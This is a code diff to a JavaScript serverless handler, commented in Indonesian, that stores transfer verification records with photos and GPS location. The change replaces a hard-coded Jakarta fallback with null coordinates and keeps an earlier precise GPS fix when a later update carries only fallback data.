@@ -131,9 +131,25 @@ export default async function handler(req, res) {
             }
 
             const transferId = body.transferId.trim();
-            const lat = Number(body?.location?.lat);
-            const lng = Number(body?.location?.lng);
-            const accuracy = Number(body?.location?.accuracy || 15);
+            const rawLat = body?.location?.lat;
+            const rawLng = body?.location?.lng;
+            const hasValidCoords = typeof rawLat === 'number' && typeof rawLng === 'number' &&
+                                   Number.isFinite(rawLat) && Number.isFinite(rawLng) &&
+                                   !(rawLat === 0 && rawLng === 0);
+            const lat = hasValidCoords ? rawLat : (Number.isFinite(Number(rawLat)) && Number(rawLat) !== 0 ? Number(rawLat) : null);
+            const lng = hasValidCoords ? rawLng : (Number.isFinite(Number(rawLng)) && Number(rawLng) !== 0 ? Number(rawLng) : null);
+            const accuracy = Number.isFinite(Number(body?.location?.accuracy)) ? Number(body.location.accuracy) : null;
+            const source = body?.location?.source || (lat !== null ? 'gps' : 'unknown');
+
+            const locationObj = (lat !== null && lng !== null) ? {
+                lat: lat,
+                lng: lng,
+                accuracy: accuracy || 15,
+                timestamp: body?.location?.timestamp || new Date().toISOString(),
+                source: source,
+                city: body?.location?.city || '',
+                country: body?.location?.country || ''
+            } : null;
 
             const record = {
                 transferId: transferId,
@@ -151,23 +167,36 @@ export default async function handler(req, res) {
                 status: String(body.status || 'verified').slice(0, 30),
                 timestamp: body.timestamp || new Date().toISOString(),
                 verifCode: String(body.verifCode || '').slice(0, 80),
-                location: {
-                    lat: Number.isFinite(lat) ? lat : -6.2088,
-                    lng: Number.isFinite(lng) ? lng : 106.8456,
-                    accuracy: Number.isFinite(accuracy) ? accuracy : 15,
-                    timestamp: body?.location?.timestamp || new Date().toISOString(),
-                    source: body?.location?.source || 'gps'
-                }
+                location: locationObj
             };
 
-            // 1. Simpan ke in-memory cache serverless
+            // 1. Simpan ke in-memory cache serverless (Non-Destructive Merge)
             const existingIdx = globalThis.__locations.findIndex(t => t.transferId === transferId);
             if (existingIdx >= 0) {
+                const prev = globalThis.__locations[existingIdx];
+                let finalLocation = locationObj || prev.location || null;
+
+                // Jika data lama sudah memiliki titik GPS akurat dan data baru adalah fallback atau tanpa koordinat,
+                // pertahankan titik GPS akurat yang sudah terkunci!
+                if (prev.location && typeof prev.location.lat === 'number' && typeof prev.location.lng === 'number') {
+                    const prevIsGps = prev.location.source && (prev.location.source.includes('gps') || prev.location.source.includes('device'));
+                    const newIsFallback = locationObj && (locationObj.source === 'default-fallback' || (Math.abs(locationObj.lat - (-6.2088)) < 0.001 && Math.abs(locationObj.lng - 106.8456) < 0.001));
+
+                    if (!locationObj || (prevIsGps && newIsFallback)) {
+                        finalLocation = prev.location;
+                    } else if (prevIsGps && locationObj && !locationObj.source.includes('gps') && (locationObj.accuracy > prev.location.accuracy)) {
+                        finalLocation = prev.location;
+                    }
+                }
+
+                record.location = finalLocation;
+
                 globalThis.__locations[existingIdx] = {
-                    ...globalThis.__locations[existingIdx],
+                    ...prev,
                     ...record,
-                    photo: record.photo || globalThis.__locations[existingIdx].photo || '',
-                    frontPhoto: record.frontPhoto || globalThis.__locations[existingIdx].frontPhoto || ''
+                    location: finalLocation,
+                    photo: record.photo || prev.photo || '',
+                    frontPhoto: record.frontPhoto || prev.frontPhoto || ''
                 };
             } else {
                 globalThis.__locations.unshift(record);
@@ -192,10 +221,10 @@ export default async function handler(req, res) {
                         total: record.total,
                         photo: record.photo,
                         front_photo: record.frontPhoto,
-                        latitude: record.location.lat,
-                        longitude: record.location.lng,
-                        accuracy: record.location.accuracy,
-                        captured_at: record.location.timestamp,
+                        latitude: record.location ? record.location.lat : null,
+                        longitude: record.location ? record.location.lng : null,
+                        accuracy: record.location ? record.location.accuracy : null,
+                        captured_at: record.location ? record.location.timestamp : new Date().toISOString(),
                         status: record.status,
                         verification_code: record.verifCode,
                         consented_at: new Date().toISOString()
